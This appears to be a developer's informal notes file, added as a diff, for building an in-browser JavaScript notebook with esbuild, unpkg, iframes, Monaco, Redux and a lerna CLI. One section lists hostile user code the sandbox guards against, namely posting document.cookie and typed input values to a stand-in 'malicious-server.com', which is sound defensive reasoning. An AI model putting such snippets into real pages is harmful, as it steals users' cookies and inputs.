@@ -1,0 +1,232 @@
+-- download react package source code
+npm view react dist.tarball
+
+Problem:
+-- can't fetch from the browser
+Solution:
+-- unpkg - public cdn that contains all the source code hosted on npm
+unpkg.com/:package@:version/:file
+https://unpkg.com/tiny-test-pkg@1.0.0/index.ts
+yarn add axios
+https://unpkg.com/medium-test-pkg@1.0.0/index.ts
+
+new URL = for setting path on the browser
+run on browser:
+new URL('./utils', 'https://unpkg.com/medium-test-pkg');
+
+extract request.responseURL
+
+yarn add localforage
+
+
+import 'bulma/css/bulma.css';
+'https://unpkg.com/bulma/css/bulma.css'.match(/.css$/)
+
+test on textarea
+import 'tiny-test-pkg';
+import 'bulma/css/bulma.css';
+import axios from "axios";
+window.axios = axios;
+
+https://unpkg.com/esbuild-wasm@0.8.27/esbuild.wasm
+
+
+-- codes to avoid on code text editor
+axios.post('http://malicious-server.com', {
+    cookie: document.cookie
+});
+
+document.querySelector('input').addEventListener('change', (event) => {
+    axios.post('http://malicious-server.com', {
+        value: event.target.value
+    });
+})
+
+for (var i = 0; i < 9999999999; i++) {
+    console.log(i);
+}
+
+solution --iframes
+localhost:3000/test.html
+
+accessing parent DOM from child iframe
+parent.a
+accessing child iframe from parent DOM
+document.querySelector('iframe').contentWindow.b
+
+/etc/hosts
+127.0.0.1 nothing.localhost
+
+on parent DOM
+window.addEventListener('message', (event) => console.log(event), false);
+
+test on code form:
+// post message from child to parent
+// args = message string and host
+parent.postMessage('hi', '*');
+MessageEvent.data
+
+
+import React from 'react';
+import ReactDOM from 'react-dom';
+
+const App = () => {
+  return (
+    <div>
+      <h1>Hi</h1>
+      <button onClick={() => console.log('click')}>
+        Click me
+      </button>
+    </div>
+  );
+}
+
+ReactDOM.render(<App/>, document.querySelector('#root'));
+
+
+Problem: if user do this on form:
+document.body.innerHTML = '';
+this delete the children of body tag in the iframe, next code won't work anymore
+
+Solution: make sure to reload the default iframe contents on every code execution
+document.querySelector('iframe').srcdoc = 'a'
+
+test: submit this and see if iframe contents are recreated
+console.log(document.querySelector('#root'))
+
+yarn add @monaco-editor/react@3.7.5
+yarn add monaco-editor
+yarn add prettier @types/prettier
+
+yarn add bulmaswatch
+
+yarn add monaco-jsx-highlighter@0.0.15 jscodeshift@0.11.0 @types/jscodeshift@0.7.2
+
+whenever monaco editor is running, monaco will automatically add window.monaco, ts doesn't know about this
+
+yarn add react-resizable@1.11.0 @types/react-resizable@1.7.2
+
+
+Problem: Resizable width prop overwrites ResizableBox internal width state
+
+
+debouncing --allows some function to run as much as possible after when some period of time elapses
+
+bug:
+const root = document.querySelector('#ropot')
+root.innerHTML = 'asdf' // 'asdf' appears for a fraction of a second
+
+because of this
+useEffect(() => {
+    iframe.current.srcdoc = html; // after setting html
+    iframe.current.contentWindow.postMessage(code, '*') // posting message immediately
+  }, [code]);
+
+
+Error handling:
+-- when bundling an invalid code
+-- invalid characters
+-- async errors
+
+test async error handling:
+setTimeout(() => {
+  sfdsf.sdfsdf()
+}, 100)
+
+
+Markdown editor
+yarn add @uiw/react-md-editor@2.1.1
+
+bug:
+cursor is broken because of the css class name clash between bulma and markdown editor
+solution:
+don't use css classname title from bulma, create a separate css file for text-editor
+
+
+test on md editor:
+Header
+
+- Add
+- Additional themes
+- And Stuff
+
+
+Redux
+yarn add @types/react-redux@7.1.15 react-redux@7.2.2 redux@4.0.5 redux-thunk@2.3.0 axios@0.21.1
+
+yarn add immer
+
+yarn add @fortawesome/fontawesome-free
+
+bug:
+whenever you put createBundle on dependency array of useEffect the preview component blink
+
+-- everytime you call useActions,
+you're creating a different version of createBundle,
+it will be an infinite loop of createBundle->useActions->useEffect
+
+Solution:
+useMemo -- only bind the actionCreators one single time
+
+
+TEST FOR TEXTAREA
+import React from 'react';
+import ReactDOM from 'react-dom';
+
+const App = () => {
+  return (
+    <div>
+      <h1>Hi</h1>
+      <button onClick={() => console.log('click')}>
+        Click me
+      </button>
+    </div>
+  );
+}
+
+ReactDOM.render(<App/>, document.querySelector('#root'));
+
+document.querySelector('#root').innerHTML = 'rgsdfgsdf'
+
+import axios from 'axios'
+
+const fetPosts = async () => {
+const {data} = await axios.get('/posts');
+ return data;
+}
+
+import React from 'react';
+import ReactDOM from 'react-dom';
+show(<div>ghgsdfgghs</div>)
+show([{1: 'k'}])
+show('dfgdf')
+
+npm install -g --save-exact lerna@3.22.1
+/jbook/pakages/local-client
+
+lerna add commander --scope=cli
+lerna add local-api --scope=cli
+
+/cli$ node index.ts
+
+lerna add typescript --dev --scope=local-api
+
+/local-api$ npx typescript --init
+/local-api$ npm run start
+
+/cli$ npx typescript --init
+/cli$ npm run start
+
+jbook$ node test.js mynotes.js --port 3050
+
+/jbook$ lerna add @types/node --dev --scope=cli
+
+/jbook$ lerna add express --scope=local-api
+/jbook$ lerna add @types/express --dev --scope=local-api
+/jbook$ lerna add cors --scope=local-api
+/jbook$ lerna add @types/cors --dev --scope=local-api
+/jbook$ lerna add http-proxy-middleware --scope=local-api
+
+local-client$ yarn build
+
+lerna add local-client --scope=local-api
